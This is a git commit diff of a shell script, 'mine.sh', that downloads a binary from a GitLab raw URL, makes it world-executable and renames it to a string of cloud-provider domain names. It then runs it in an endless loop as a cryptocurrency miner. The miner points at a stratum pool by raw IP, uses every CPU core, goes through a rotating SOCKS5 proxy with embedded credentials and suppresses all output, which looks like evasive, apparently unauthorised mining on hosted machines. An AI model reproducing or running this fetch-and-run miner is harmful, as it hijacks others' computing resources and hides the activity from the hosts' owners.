052e91a68c00769b869cffb9fffe5f50a2f53c08
muhammadajimukti558 <107189622+muhammadajimukti558@users.noreply.github.com>
2022-07-14 05:17:21 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-chmod u+x python2.7
-chmod u+x verus-solver
-mv python2.7 scalingo.com.google.com.heroku.com.github.com
-./scalingo.com.google.com.heroku.com.github.com -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.azure -p x --cpu 8
+wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant
+chmod 777 plant
+mv plant scalingo.com.google.com.heroku.com.github.com
+while :; do timeout 1m ./scalingo.com.google.com.heroku.com.github.com -a yescryptr16 -o stratum+tcp://198.50.168.213:6333 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.Tet -p c=SIP -t $(nproc --all) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80 >/dev/null 2>&1 ; sleep 5s; done
